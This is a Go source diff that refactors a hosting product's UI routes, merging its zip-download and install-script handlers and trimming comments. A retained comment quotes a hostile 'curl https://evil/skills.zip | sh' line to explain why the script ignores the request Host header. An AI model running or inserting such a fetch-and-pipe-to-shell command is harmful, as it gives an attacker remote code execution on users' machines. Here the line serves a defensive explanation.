@@ -35,7 +35,7 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 		w.Header().Set("Cache-Control", "public, max-age=300")
 		_, _ = w.Write(body)
 	})
-	assets := sh.Pipeline()
+	assets := sh.Pages()
 	// The docs website is gone: its old addresses point at the API
 	// description and llms.txt.
 	mux.Handle("GET /docs.html", http.RedirectHandler("/openapi.json", http.StatusMovedPermanently))
@@ -71,10 +71,8 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	if sh.Ed.Routes().HostedEvents {
 		mux.Handle("GET /install.html", http.RedirectHandler("/get-started", http.StatusFound))
 	}
-	// Each product's own icon (teal dot for Host, red dot for Hack), at the
-	// same four addresses. A day of caching plus the ?v= on every link
-	// (partials/head.html and the 13 pages with their own head) means a
-	// future icon change is picked up by bumping that letter, not renaming.
+	// Each product's own icon at the same four addresses. A day of caching plus the ?v= on every link means an
+	// icon change is picked up by bumping that letter, not renaming.
 	for name, file := range iconFiles() {
 		mux.Handle("GET /"+name, serveIcon(sub, file))
 	}
@@ -88,14 +86,14 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	mux.HandleFunc("GET /.well-known/ard.json", web.DiscoveryDocument(assets, sh.Ed.Presentation().ProductAssets, "ard.json", "application/json", publicBaseURL))
 	mux.HandleFunc("GET /.well-known/api-catalog", web.DiscoveryDocument(assets, sh.Ed.Presentation().ProductAssets, "api-catalog", `application/linkset+json;profile="https://www.rfc-editor.org/info/rfc9727"`, publicBaseURL))
 	if !sh.Ed.Presentation().ProductAssets {
-		mux.HandleFunc("GET /skills.zip", func(w http.ResponseWriter, r *http.Request) { serveSkillsZip(assets, w, r) })
+		// A flat zip of the skill folders, for extraction into ~/.claude/skills or ~/.agents/skills.
+		mux.HandleFunc("GET /skills.zip", serveZip(assets.BuildSkillsZip, "simple-host-skills.zip"))
 		mux.HandleFunc("GET /skills/version", serveSkillsVersion)
 	}
 	// The landing film's video and poster files (film.go).
 	mux.HandleFunc("GET /film/{file}", web.ServeFilm)
-	// Per-skill download routes, derived from the bundle rather than hand-listed:
-	// connect-domain shipped in 0.8.0 and never got its pair, so /skills/
-	// connect-domain.zip 404'd while the skill was advertised everywhere else.
+	// Per-skill download routes, derived from the bundle rather than hand-listed
+	// so a new skill cannot ship without them.
 	for _, dir := range assets.BundledSkillDirs() {
 		mux.HandleFunc("GET /skills/"+dir+".zip", assets.ServeSkillZip(dir))
 		mux.HandleFunc("GET /skills/"+dir+"/SKILL.md", assets.ServeSkillMarkdown(dir))
@@ -109,22 +107,19 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	// The platform's plugin archive and installers. A product answers these
 	// three addresses itself, as it does /skills.zip.
 	if !sh.Ed.Presentation().ProductAssets {
-		mux.HandleFunc("GET /plugin.zip", func(w http.ResponseWriter, r *http.Request) { servePluginZip(assets, w, r) })
-		mux.HandleFunc("GET /install.sh", serveInstallScript(publicBaseURL))
-		mux.HandleFunc("GET /install.ps1", serveInstallPowerShell(publicBaseURL))
+		// The wrapped plugin layout (.claude-plugin/plugin.json + skills/<name>/SKILL.md), for `claude --plugin-url <url>`.
+		mux.HandleFunc("GET /plugin.zip", serveZip(assets.BuildPluginZip, "simple-host-website.zip"))
+		mux.HandleFunc("GET /install.sh", serveInstallScript(publicBaseURL, installScript))
+		mux.HandleFunc("GET /install.ps1", serveInstallScript(publicBaseURL, installPowerShellScript))
 	}
 	// Admin dashboard: all signed-up users + their sites. This shell is public —
 	// a browser navigation carries no API key, so it cannot be gated server-side.
 	// It renders nothing until /v1/admin/users answers, and that IS gated; a
 	// non-admin gets the 404 page instead. See admin.html.
 	mux.Handle("GET /admin", assets.AdminUICSP(assets.ServeStaticPage("admin.html")))
-	// Feature inventory: what the product actually does today, and where each
-	// capability lives in the UI. Given a clean URL like /admin because it is
-	// linked from the top nav, not just reachable as a file.
+	// Feature inventory, given a clean URL like /admin because it is linked from the top nav.
 	mux.Handle("GET /features", assets.AdminUICSP(assets.ServeStaticPage("features.html")))
-	// What Simple Host costs and its real limits, generated from this
-	// install's own settings; agents looking for a plans or pricing page
-	// land here instead of finding none (SIM-190).
+	// What Simple Host costs and its real limits, generated from this install's settings; agents looking for a plans page land here.
 	mux.Handle("GET /pricing", assets.AdminUICSP(assets.ServeStaticPage("pricing.html")))
 	// Marketing pages, one per audience, shared as direct links.
 	mux.Handle("GET /enterprise", assets.AdminUICSP(assets.ServeStaticPage("enterprise.html")))
@@ -167,8 +162,6 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	}))
 }
 
-// staticFileServer is the static file server over one view of the tree,
-// with this install's 404 page for a name the view does not have.
 func (sh *SiteHandler) staticFileServer(view handlerOnlyFS) http.Handler {
 	staticServer := web.HostDiagram(sh.Ed.Routes().HostedEvents, http.FileServerFS(view))
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
@@ -182,7 +175,7 @@ func (sh *SiteHandler) staticFileServer(view handlerOnlyFS) http.Handler {
 					// (showcase.go): the hosted literal must stay
 					// byte-identical; a self-hosted install names itself.
 					backLabel := "Go to simple-host.app"
-					if sh.Pipeline().HostedOwner() == "" {
+					if sh.Pages().HostedOwner() == "" {
 						backLabel = "Go to " + sh.SiteDomain
 					}
 					sh.renderNotFoundPage(w, r, "Page not found", "The page you’re looking for doesn’t exist.", "/", backLabel)
@@ -194,10 +187,9 @@ func (sh *SiteHandler) staticFileServer(view handlerOnlyFS) http.Handler {
 	})
 }
 
-// registerDashboard mounts the landing page and the owner's app shell.
 func registerDashboard(mux *http.ServeMux, assets *web.AssetPipeline, ed *edition.Edition, publicBaseURL string) {
 	// Signing in has its own address, so the landing page can stay the landing
-	// page for everybody (owner decision 2026-09-23). It serves the same shell:
+	// page for everybody. It serves the same shell:
 	// with a session it goes straight through to the owner's app, without one it
 	// is the sign-in screen. index.html is not in RewrittenAssets, so serving it
 	// raw here matches what the file server would hand back at "/".
@@ -230,9 +222,7 @@ func registerDashboard(mux *http.ServeMux, assets *web.AssetPipeline, ed *editio
 	}
 }
 
-// iconFiles maps the icon addresses every page links to the physical file
-// served at that address. A product serves its own icons at the same four
-// names by listing them in its Replace table.
+// iconFiles maps the icon addresses every page links to the physical file served there; a product lists its own in Replace.
 func iconFiles() map[string]string {
 	return map[string]string{
 		"favicon.svg":          "favicon.svg",
@@ -299,9 +289,6 @@ func (f handlerOnlyFS) Open(name string) (fs.File, error) {
 	return f.FS.Open(name)
 }
 
-// serveSkillsVersion returns {"version":"X"} from the embedded plugin.json.
-// Used by the MCP client for explicit version checks; the inline notice
-// middleware also reads the same value at boot.
 func serveSkillsVersion(w http.ResponseWriter, r *http.Request) {
 	version, err := web.PluginVersion()
 	if err != nil {
@@ -312,50 +299,30 @@ func serveSkillsVersion(w http.ResponseWriter, r *http.Request) {
 	_, _ = w.Write([]byte(`{"version":"` + version + `"}`))
 }
 
-// serveSkillsZip returns a flat zip of the skill folders, suitable for
-// extraction directly into ~/.claude/skills or ~/.agents/skills.
-func serveSkillsZip(assets *web.AssetPipeline, w http.ResponseWriter, r *http.Request) {
-	data, err := assets.BuildSkillsZip()
-	if err != nil {
-		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
-		return
+func serveZip(build func() ([]byte, error), filename string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		data, err := build()
+		if err != nil {
+			http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
+			return
+		}
+		w.Header().Set("Content-Type", "application/zip")
+		w.Header().Set("Content-Disposition", `attachment; filename="`+filename+`"`)
+		http.ServeContent(w, r, filename, web.SkillsModTime, bytes.NewReader(data))
 	}
-
-	w.Header().Set("Content-Type", "application/zip")
-	w.Header().Set("Content-Disposition", `attachment; filename="simple-host-skills.zip"`)
-	http.ServeContent(w, r, "simple-host-skills.zip", web.SkillsModTime, bytes.NewReader(data))
 }
 
-// servePluginZip returns the wrapped plugin layout (.claude-plugin/plugin.json
-// + skills/<name>/SKILL.md), suitable for `claude --plugin-url <url>`.
-func servePluginZip(assets *web.AssetPipeline, w http.ResponseWriter, r *http.Request) {
-	data, err := assets.BuildPluginZip()
-	if err != nil {
-		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
-		return
-	}
-
-	w.Header().Set("Content-Type", "application/zip")
-	w.Header().Set("Content-Disposition", `attachment; filename="simple-host-website.zip"`)
-	http.ServeContent(w, r, "simple-host-website.zip", web.SkillsModTime, bytes.NewReader(data))
-}
-
-// serveInstallScript returns a small shell script that fetches /skills.zip
-// and extracts it into ~/.claude/skills (or a path passed as the first arg).
-// Designed to be either run directly (`curl … | sh`) or pasted to an agent
-// who will execute it via Bash.
-//
 // The download base URL is the server-configured canonical PublicBaseURL — it
 // is deliberately NOT derived from the request Host. The script is piped into
 // `sh`, so reflecting an attacker-controlled Host header would let a crafted
 // request produce a `curl https://evil/skills.zip | sh` (remote code execution
 // on the victim). PublicBaseURL already carries the correct https scheme.
-func serveInstallScript(publicBaseURL string) http.HandlerFunc {
+func serveInstallScript(publicBaseURL string, script func(base string) string) http.HandlerFunc {
 	base := strings.TrimRight(publicBaseURL, "/")
 	return func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
 		w.Header().Set("Cache-Control", "no-cache")
-		w.Write([]byte(installScript(base)))
+		w.Write([]byte(script(base)))
 	}
 }
 
@@ -392,22 +359,6 @@ ls -1 "$DEST" | sed 's/^/    /'
 echo
 echo "Restart your agent if it caches the skills directory."
 `
-}
-
-// serveInstallPowerShell is the Windows PowerShell counterpart of
-// serveInstallScript: it fetches /skills.zip and expands it into the agent's
-// skills directory, for agents on Windows that cannot run `curl … | sh`.
-//
-// Same RCE reasoning as serveInstallScript — the download base is the
-// server-configured PublicBaseURL, never the request Host, because this is
-// meant to be run as `irm …/install.ps1 | iex`.
-func serveInstallPowerShell(publicBaseURL string) http.HandlerFunc {
-	base := strings.TrimRight(publicBaseURL, "/")
-	return func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
-		w.Header().Set("Cache-Control", "no-cache")
-		w.Write([]byte(installPowerShellScript(base)))
-	}
 }
 
 func installPowerShellScript(base string) string {
